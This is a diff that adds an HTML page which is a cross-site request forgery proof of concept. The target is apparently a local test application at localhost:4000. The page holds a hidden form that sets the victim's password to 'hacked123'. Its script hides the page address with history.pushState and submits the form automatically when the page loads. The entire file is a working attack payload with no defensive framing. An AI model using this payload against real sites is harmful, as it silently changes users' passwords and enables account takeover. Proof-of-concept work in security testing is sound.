@@ -1,0 +1,12 @@
+<html>
+  <body>
+    <form action="http://localhost:4000/change-password" method="POST">
+      <input type="hidden" name="newPassword" value="hacked123" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
